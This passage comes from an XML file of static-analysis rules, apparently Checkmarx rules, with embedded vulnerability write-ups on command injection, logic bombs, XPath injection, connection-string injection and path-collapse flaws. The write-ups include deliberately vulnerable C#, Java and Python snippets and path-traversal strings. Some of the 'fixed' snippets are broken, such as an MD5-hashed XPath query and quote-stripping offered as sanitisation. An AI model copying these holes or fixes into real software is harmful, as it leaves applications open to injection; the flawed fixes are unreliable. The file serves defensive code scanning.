nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences, Relationships, Other Notes,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-10-29&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences,
Other Notes&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Previous Entry Names&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Change Date&lt;/th&gt;&lt;th valign="top" nowrap="" colspan="3"&gt;Previous Entry
Name&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2008-04-11&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Improper Temporary File
Opening&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1057</key><name>Potential_Command_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could run arbitrary system-level OS commands on the application server host. Depending on the application&amp;rsquo;s OS permissions, these could include:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;File actions (read / create / modify / delete)&lt;/li&gt;
&lt;li&gt;Open a network connection to the attacker&amp;rsquo;s server&lt;/li&gt;
&lt;li&gt;Start and stop system services&lt;/li&gt;
&lt;li&gt;Complete server takeover&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application runs an OS system-level command to complete it's task, rather than via application code. The command includes untrusted data, that may be controllable by an attacker. This untrusted string may contain malicious, system-level commands engineered by an attacker, which would be executed as though the attacker were running commands directly on the application server.&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Refactor the code to avoid any direct shell command execution. Instead, use platform provided APIs or library calls.&lt;/li&gt;
&lt;li&gt;If it is impossible to remove the command execution, execute only static commands that do not include dynamic, user-controlled data.&lt;/li&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified format, rather than rejecting bad patterns (blacklist). Parameters should be limited to an allowed character set, and non-validated input should be dropped. In addition to characters, check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;In order to minimize damage as a measure of defense in depth, configure the application to run using a restricted user account that has no unnecessary OS privileges.&lt;/li&gt;
&lt;li&gt;If possible, isolate all OS commands to use a separate, dedicated user account that has minimal privileges only for the specific commands and files used by the application, according to the Principle of Least Privilege.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1651</key><name>Logic_Time_Bomb</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Logic/Time Bomb&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;511&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_511_Description" id="oc_511_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The software contains code that is designed to disrupt the
legitimate operation of the software (or its environment) when a certain time
passes, or when a certain logical condition is met.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;When the time bomb or logic bomb is detonated, it may perform a denial of
service such as crashing the system, deleting critical data, or degrading
system response time. This bomb might be placed within either a replicating
or non-replicating Trojan horse.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_511_Time of Introduction" id="oc_511_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;li&gt;Operation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_511_Applicable Platforms" id="oc_511_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_511_Demonstrative Examples" id="oc_511_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;Typical examples of triggers include system date or time mechanisms,
random number generators, and counters that wait for an opportunity to
launch their payload. When triggered, a time-bomb may deny service by
crashing the system, deleting files, or degrading system
response-time.&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_511_Potential Mitigations" id="oc_511_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Always verify the integrity of the software that is being
installed.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;Conduct a code coverage analysis using live testing, then closely
inspect the code that is not covered.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_511_Relationships" id="oc_511_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;506&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=506" target="_blank"&gt;Embedded Malicious Code&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_511_Taxonomy Mappings" id="oc_511_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Landwehr&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Logic/Time Bomb&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_511_Content History" id="oc_511_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Landwehr&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-10-14&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1067</key><name>Potential_XPath_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Depending on the type of information contained in the queried XML document, an attacker could cause any effect of selecting the wrong information from the XML document, such as stealing unauthorized data or impersonating another user.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application queries an XML document by using a textual XPath query. The application creates the query by simply concatenating strings including the user's input. Since the user input is neither checked for data type validity nor subsequently sanitized, the input could be maliciously crafted to cause the application to select the wrong information from the XML document.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Ideally, avoid making the xpath query dependent on user input. If it is necessary to make the query dependent on user input, preferably map XPath queries to user parameters, maintaining separation between data and code. If it is necessary to include the user input in the query, the input must be first properly validated as above.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The application uses a user inputed string to construct an XPath query
      &lt;/h4&gt;&lt;pre&gt;class XPathInjection
    {
        static void foo(XPathDocument document)
        {
            XPathNavigator navigator = document.CreateNavigator();
            string input = Console.ReadLine();
            XPathNodeIterator nodes = navigator.Select(input);
        }
    }&lt;/pre&gt;&lt;h4&gt;
The user inputed string is encoded before usage in the XPath query
      &lt;/h4&gt;&lt;pre&gt;class XPathInjectionFixed
    {
        static void foo(XPathDocument document)
        {
            XPathNavigator navigator = document.CreateNavigator();
            string input = Console.ReadLine();
                        byte[] fileName = md5.ComputeHash(System.Text.Encoding.ASCII.GetBytes(input));
                        input = System.Text.Encoding.Default.GetString(fileName);
            XPathNodeIterator nodes = navigator.Select(input);
        }
    }&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;The application uses a user inputed string to construct an XPath query&lt;/h4&gt;&lt;pre&gt;public class XPath_Injection {
	public static void main(String[] args) {
		Scanner userInputScanner = new Scanner(System.in);
		System.out.print("\nEnter xpath expression: ");
		String expression = userInputScanner.nextLine();

		// read a string value
		XPath xPath = XPathFactory.newInstance().newXPath();
		try {
			XPathExpression email = xPath.compile(expression);
		} catch (XPathExpressionException e) {
			e.printStackTrace();
		}
	}
}&lt;/pre&gt;&lt;h4&gt;The user inputed string is encoded before usage in the XPath query&lt;/h4&gt;&lt;pre&gt;public class XPath_Injection_Fixed {
	public static void main(String[] args) {
		HashMap&lt;String, String&gt; sanitize = new HashMap&lt;String, String&gt;();
		sanitize.put("student", "/class/student");
		sanitize.put("graduate", "/class/graduate");
		sanitize.put("professor", "/class/professor");
		Scanner userInputScanner = new Scanner(System.in);
		System.out.print("\nEnter xpath expression: ");
		String expression = userInputScanner.nextLine();

		// read a string value
		XPath xPath = XPathFactory.newInstance().newXPath();
		try {
			XPathExpression email = xPath.compile(sanitize.get(expression));
		} catch (XPathExpressionException e) {
			e.printStackTrace();
		}
	}
}&lt;/pre&gt;&lt;h3&gt;Python&lt;/h3&gt;&lt;h4&gt;The application uses a user inputed string to construct an XPath query&lt;/h4&gt;&lt;pre&gt;from sys import stdin
import xpath
print 'Insert item number: '
userInput = stdin.readline()	
xpath.find('//item' + userInput, doc)&lt;/pre&gt;&lt;h4&gt;The user inputed string is turned into an integer before usage in the XPath query&lt;/h4&gt;&lt;pre&gt;from sys import stdin
import xpath
print 'Insert item number: '
userInput = stdin.readline()	
xpath.find('//item' + str(int(userInput)), doc)&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1058</key><name>Potential_Connection_String_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could manipulate the application&amp;#8217;s connection string to its database or other server.Using simple tools and text editing, the attacker might be able do any of the following:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Damage application performance (by increasing the MIN POOL SIZE)&lt;/li&gt;
&lt;li&gt;Tamper with the network connection (for example, via TRUSTED CONNECTION)&lt;/li&gt;
&lt;li&gt;Direct the application to the attacker&amp;#8217;s bogus database&lt;/li&gt;
&lt;li&gt;Discover the password to the system account on the database (by a brute-force attack)&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;To communicate with its database or with another server (for example, Active Directory), the application dynamically constructs a connection string. This connection string includes concatenated user input. Since the user input is neither checked for data type validity nor subsequently sanitized, the input could be used to maliciously manipulate the connection string.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Ideally, avoid dynamically building connection strings. If it is necessary to dynamically build a connection string, try not to include user input. In any case use platform-provided utlities, such as .NET&amp;#8217;s SqlConnectionStringBuilder, or at least encode the validated input as appropriate for your platform.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The application constructs a connection string using input from the user
      &lt;/h4&gt;&lt;pre&gt;

 class ConnectionStringInjection
{
        static void foo(Textbox textbox1, SqlConnectionStringBuilder bldr)
        {
                bldr.UserID = textbox1.Text;
                myConnection = new SqlConnection(bldr.ToString());
        }
}



      &lt;/pre&gt;&lt;h4&gt;
The user input is first checked for malicious characters before adding to the connection string
      &lt;/h4&gt;&lt;pre&gt;

 class ConnectionStringInjectionFixed
{
        static void foo(Textbox textbox, SqlConnectionStringBuilder bldr)
        {
                bldr.UserID = textbox.Text.Replace("'", "");
                myConnection = new SqlConnection(bldr.ToString());
        }
}



      &lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;The application constructs a connection string using input from the user&lt;/h4&gt;&lt;pre&gt;public class ConnectionStringInjection {
	public static void main(String[] args) throws SQLException {
		Scanner userInputScanner = new Scanner(System.in);
		System.out.print("\nEnter url name: ");
		String connURL = userInputScanner.nextLine();
		Connection con = DriverManager.getConnection(connURL, "username", "password");
	}
}&lt;/pre&gt;&lt;h4&gt;The user input is translated to a predefined connection string&lt;/h4&gt;&lt;pre&gt;public class ConnectionStringInjectionFixed {
	public static void main(String[] args) throws SQLException {
		HashMap&lt;String, String&gt; sanitize = new HashMap&lt;String, String&gt;();
		sanitize.put("DB_url_1", "DB_url_1");
		sanitize.put("DB_url_2", "DB_url_2");
		sanitize.put("DB_url_3", "DB_url_3");
		Scanner userInputScanner = new Scanner(System.in);
		System.out.print("\nEnter url name: ");
		String connURL = userInputScanner.nextLine();
		Connection con = DriverManager.getConnection(sanitize.get(connURL), "username", "password");
	}
}&lt;/pre&gt;&lt;h3&gt;Python&lt;/h3&gt;&lt;h4&gt;The application constructs a connection string using input from the user&lt;/h4&gt;&lt;pre&gt;from sys import stdin
import cx_Oracle
print 'Insert your ID: '
userInput = stdin.readline()
connection = cx_Oracle.connect(userInput + '/password@99.999.9.99:PORT/SID')&lt;/pre&gt;&lt;h4&gt;The user inputed file number is turned to a string of that number before use&lt;/h4&gt;&lt;pre&gt;from sys import stdin
import cx_Oracle
print 'Insert your ID: '
userInput = stdin.readline()
connection = cx_Oracle.connect(str(int(userInput)) + '/password@99.999.9.99:PORT/SID')&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1640</key><name>Collapse_of_Data_into_Unsafe_Value</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Collapse of Data Into Unsafe Value&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;182&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_182_Description" id="oc_182_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The software cleanses or filters data in a way that causes the
data to be reduced or "collapsed" into an unsafe value.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_182_Time of Introduction" id="oc_182_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_182_Applicable Platforms" id="oc_182_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Observed Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Observed Examples&lt;/div&gt;&lt;div name="oc_182_Observed Examples" id="oc_182_Observed Examples" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Reference&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0815" target="_blank"&gt;CVE-2004-0815&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;"/.////" in pathname collapses to absolute
path.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3123" target="_blank"&gt;CVE-2005-3123&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;"/.//..//////././" is collapsed into "/.././"
after ".." and "//" sequences are removed.&lt;/td&gt;&lt;/tr&gt;
